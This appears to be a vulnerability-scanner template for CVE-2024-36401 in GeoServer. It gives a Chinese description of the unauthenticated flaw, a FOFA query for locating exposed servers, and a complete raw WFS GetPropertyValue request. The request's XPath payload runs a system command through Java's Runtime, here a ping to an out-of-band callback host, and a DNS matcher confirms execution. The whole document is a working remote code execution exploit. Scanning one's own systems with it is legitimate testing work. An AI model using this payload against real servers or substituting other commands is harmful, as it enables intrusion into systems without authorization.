id: CVE-2024-36401

info:
  name: GeoServer GetPropertyValue RCE (CVE-2024-36401)
  author: Co5mos
  severity: critical
  description: |
    GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。
    在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。
  metadata:
    verified: true
    fofa-query: 'app="GeoServer"'
  tags: cve, geoserver, cve2024, rce

http:
  - raw:
    - |
      POST /geoserver/wfs HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/xml

      <wfs:GetPropertyValue service='WFS' version='2.0.0'
       xmlns:topp='http://www.openplans.org/topp'
       xmlns:fes='http://www.opengis.net/fes/2.0'
       xmlns:wfs='http://www.opengis.net/wfs/2.0'>
        <wfs:Query typeNames='sf:archsites'/>
        <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'ping {{interactsh-url}} -c 2')</wfs:valueReference>
      </wfs:GetPropertyValue>

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
